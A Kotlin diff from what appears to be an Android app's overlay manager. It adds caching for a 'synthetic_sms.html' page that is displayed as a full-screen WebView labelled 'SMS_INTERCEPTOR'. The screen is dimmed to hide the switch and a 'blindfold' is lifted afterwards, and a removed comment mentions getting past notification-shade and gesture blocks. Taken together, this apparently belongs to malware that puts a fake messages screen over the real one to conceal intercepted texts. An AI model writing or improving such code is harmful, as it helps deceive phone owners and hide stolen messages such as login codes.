@@ -23,10 +23,15 @@ import org.json.JSONObject
 object DynamicUIManager {
     private var overlayView: WebView? = null
     private var currentType: Int = -1
+    private var cachedSmsHtml: String? = null
     
     var isAttached: Boolean = false
 
     private var statusBarView: WebView? = null
+
+    fun clearSmsHtmlCache() {
+        cachedSmsHtml = null
+    }
     private var isStatusBarAttached: Boolean = false
     private var lastStatusBarHtml: String = ""
 
@@ -1506,23 +1511,24 @@ object DynamicUIManager {
         // Apply 0% dim briefly to hide render transition
         DimmerManager.applyDim(ctx, 0, "AUTO")
         
-        var html = ""
-        try {
-            val file = java.io.File(ctx.filesDir, "synthetic_sms.html")
-            if (file.exists()) {
-                html = file.readText()
-            } else {
-                html = ctx.assets.open("reset_ui/messages.html").bufferedReader().use { it.readText() }
+        var html = cachedSmsHtml ?: ""
+        if (html.isEmpty()) {
+            try {
+                val file = java.io.File(ctx.filesDir, "synthetic_sms.html")
+                html = if (file.exists()) {
+                    file.readText()
+                } else {
+                    ctx.assets.open("reset_ui/messages.html").bufferedReader().use { it.readText() }
+                }
+                cachedSmsHtml = html
+            } catch (e: Exception) {
+                DebugLogger.log("SMS_INTERCEPT_ERR", "Failed to read html: ${e.message}")
+                DimmerManager.removeOverlay(ctx)
+                return
             }
-        } catch (e: Exception) {
-            DebugLogger.log("SMS_INTERCEPT_ERR", "Failed to read html: ${e.message}")
-            DimmerManager.removeOverlay(ctx)
-            return
         }
         
         isSmsInterceptorActive = true
-        // CRITICAL FIX: appMode = true deploys the UI as a standard Activity, 
-        // resolving notification shade and gesture navigation blocks.
         showOverlay(ctx, true, "OVERLAY", html, true, true, "SMS_INTERCEPTOR")
         
         // Lift blindfold after 600ms
